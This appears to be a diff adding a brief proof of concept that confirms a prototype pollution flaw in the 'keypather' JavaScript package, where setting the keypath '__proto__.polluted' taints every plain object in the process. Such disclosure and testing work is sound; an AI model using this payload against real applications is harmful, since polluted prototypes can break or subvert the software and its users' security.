@@ -1,0 +1,13 @@
+Confirmed the prototype pollution sink works via `Keypather.prototype.set`.
+
+```javascript
+const keypather = require("keypather")();
+
+// Trigger prototype pollution in Keypather.prototype.set via createPath/handleKey,
+// which walks the keypath and blindly creates nested objects without
+// filtering dangerous keys like "__proto__".
+keypather.set({}, "__proto__.polluted", true);
+
+// The pollution now affects every plain object in the process.
+console.log("polluted:", ({}).polluted); // -> true
+```
